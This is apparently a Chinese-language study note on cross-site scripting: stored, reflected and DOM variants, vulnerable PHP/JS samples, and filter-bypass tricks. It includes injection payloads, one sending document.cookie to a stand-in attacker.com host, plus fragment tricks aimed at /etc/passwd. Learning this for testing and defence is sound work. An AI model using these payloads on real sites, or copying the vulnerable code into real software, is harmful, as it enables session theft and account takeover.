XSS

>>> 跨站脚本攻击，应用程序的一种安全漏洞，是代码注入的一种。

通常指利用网站开发时留下的漏洞，巧妙注入恶意指令代码到网页，使用户执行以获得私密内容或得到跟高权限，会话，Cookie等内容。

恶意代码通常是js，实际上可能包含java，VBScript，ActiveX，Flash或普通HTML。

  • XSS漏洞测试流程

    1、在目标网站上找输入点，查询接口，留言板等

    2、输入一组”特殊字符+唯一识别字符”，点击提交后，查看返回的源码，是否有做对应的处理

    3、通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造js的条件（构造闭合）。

    4、提交构造的脚本代码（以及各种绕过姿势），看是否可行，如果可行就存在xss

  • # 的特性 ⚠️

    1、服务器会忽略#后的内容

    例如：发送https://example.com/path?param=123#abcdef 服务器接收到的是https://example.com/path?param=123 而#abcdef 仅在浏览器本地处理。

    2、客户端的处理逻辑

    # 后的内容（称为哈希值）主要用于：页面内导航，单页应用（SPA）中保存状态（如路由信息），不会触发页面重新加载。

    3、利用# 绕过白名单：

    假设有一台服务器有一个白名单过滤机制，仅允许访问特定路径（如/safe），而进制访问/admin，此时构造UR：https://example.com/safe#/admin

    此时服务器会认为请求的是/safe，因此允许访问，

    客户端会加载/safe页面，但同时会解析#/admin并在本地处理（即可以对/admin中内容进行操作）

  • # 的例子 ⚠️
    1. 文件包含白名单绕过若服务器仅允许包含 file=safe.txt，但通过 file=safe.txt#../etc/passwd，服务器会读取 safe.txt，而客户端若有文件解析逻辑（如某些模板引擎），可能误处理 # 后的路径。
    1. 跳转白名单绕过若服务器限制跳转域名（如仅允许 example.com），构造 https://example.com#evil.com，服务器验证通过，但客户端若有跳转逻辑依赖哈希值，可能跳转到恶意网站。
  • 跨域

    当协议，主机（主域名，子域名），端口种的任意一个不同时，称为不同域。

    不同域之间的请求数据操作，称为跨域操作。

    http:// www . xyz.com : 8080 / script/test.js
协议    子域名   主域名   端口      资源地址
  • 跨域-同源策略

    同源策略规定，两个不同域名之间不能使用JS进行相互操作。比如：x.com域名下的javascript并不能操作y.com域下的对象。

    比如：A登录了淘宝，攻击者向A发送一个恶意链接urlb:http://www.盗你cookie.com

    在没有同源策略时，urlb上的js就可以操作A的内容

  • 存储型XSS（Stored XSS, 持久型 XSS）

    >>>注入的脚本被服务器永久存储（如数据库，文件），每次访问包含该脚本的页面时都会触发。一般利用评论区，用户资料，留言板等，在用户解析html时执行。

    >>> 例如：

    问题源码：

    <?php
$name=$_GET['name'] ?? '';
if($name!='')
		file_put_contents('data.txt', $name);
$name=file_get_contents('data.txt');
echo "hello $name"
?>

    注入代码：

    ?name=<script>alert('XSS')</script>
// 更隐蔽的方法
?name=<img src=x onerror=alert(document.cookie)>

  • 反射型XSS（Reflected XSS, 非持久型 XSS）

    >>> 恶意脚本通过URL参数，表单提交等方式传递给服务器，服务器未过滤直接将脚本“反射”回页面（嵌入HTML），仅在当前请求中生效，不会被服务器存储。会通过邮件，聊天工具等欺骗用户点击URL

    >>> 代码：

    // 后端代码
$search = $_GET['query']; // 获取url参数
echo "结果：".$search; // 直接输出到页面

    注入代码：

    // 弹窗注入
?query=<script>alert('XSS')</script>
// 盗取cookie
?query=<script>document.location='http://attacker.com/cookie.php?c='+document.cookie</script>
// 无script标签的绕过
?query=<img src=x onerror=alert(document.cookie)>
// 基于事件的注入
?query=<a href="#" onclick="alert('XSS')">点击我</a>
// H5标签注入
?query=<svg onload=alert('XSS')>
  • DOM型XSS（DOM-Based XSS）

    >>> 恶意脚本未经过服务器处理，而是通过客户端javascript操作DOM时引入（参数不经过服务器），即s返回的html中不包含恶意代码，但客户端脚本在解析URL参数，Cookie等数据时，将恶意代码动态插入DOM，在脚本中执行。

    >>> 某段客户端(前端)代码：

    let hash=location.hash.slice(1); // 获取URL中 # 后的内容 （如http://x.com/#test → "test"）
document.getElementById("content").innerHTML=hash; // 将hash值插入页面

    或

    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1</title>
</head>
<body>
    <script>
        var url=new URL(window.location.href);
        var name = url.searchParams.get("name");
        document.write('hello ' + name);
    </script>
</body>
</html>

    >>> 构造注入代码

    // 弹窗测试
#<script>alert('XSS')</script>
// 盗取cookie
#<script>alert(document.cookie)</script>
// 绕过简短过滤
#<img src=x onerror=alert('DOM XSS')> // 用户访问后，客户端 JS 读取hash为<img src=x onerror=alert('DOM XSS')>，
																			// 并通过innerHTML插入页面。由于src无效，触发onerror事件，执行alert，完成攻击。
// 利用h5事件或标签
#<svg onload=alert('XSS')>
// 恶意连接注入
#<a href="javascript:alert('盗号链接')">点击领取奖励</a>
  • XSS过滤和绕过

    1、富文本过滤：编辑文本，插入超链接，图片，视频等资源，大多数支持用户直接编辑HTML。

    如果过滤器本身存在缺陷，比如将黑名单内容替换为空，可以使用双写绕过,比如如下服务：

    <?php
function filter($payload){
		$data = str_replace("script", "", $payload);
		return $data;
}
$name = filter($_GET['name']);
echo "hello $name";

......
?>
    注入：name=name=<scriscriptpt>console.log('xss')</scriscriptpt>

    2、通过将铭感词如alert()，cookie等词转换成url会解析的编码：

    <img src=x onerror='alert(1)'> // 不alert()被过滤，对alert()字符进行HTML编码
<img src=x onerror='&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;'>
    // 如果一些单词不允许出现，比如eval等，可以使用unicode编码绕过
eval('alert(1)') // 不行
\u0065\u0076\u0061\u006c('alert(1)')

    3、存在多诸如点：

    如果注入点在script标签中，被引号包裹，可以像绕过sql注入一样，先闭合引号再用分号结束语句之后代码。
如果 引号被过滤，且一行存在两个注入点：
var url='http://xxxx/?name=<?=$name?>'+'<?=$address?>'
可以用反斜杠使得第一个引号被转义，从第二个引号开始插入代码：
var url='http://xxxx/?name=\'+';alert(1);\\'

    4、CSP过滤及其绕过

    CSP：内容安全策略：一个额外的安全层，用于检测并缓解某些特定类型的注入，包括xss和数据注入。

    具体看文文档：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/CSP

    5、注释插入，利用后台过滤注释的特点

    <scr<!-- test -->ipt> alert("1123")  </scr<!-- test -->ipt>
  • 反射性和存储型XSS输出位置：

    1、HTML标签之间（闭合标签，直接内嵌）

    <div class="test">XSS payload </div>

    2、HTML属性之间（1、闭合value，借助事件触发。2、闭合标签，另起新标签）

    <input type="text" value="XSS payload">

    3、Javascript标签之内（直接插入payload，如果出现在参数值的位置就需要闭合标签）

    <script type="text/javascript">XSS payload </script>

    4、CSS标签之内（闭合标签）

    <style type="text/css"> body{XSS payload} </style>

  • Payload类型（注入点）：

    1、事件错误类。2、script标签触发类。3、借助伪协议javascript触发js代码类。
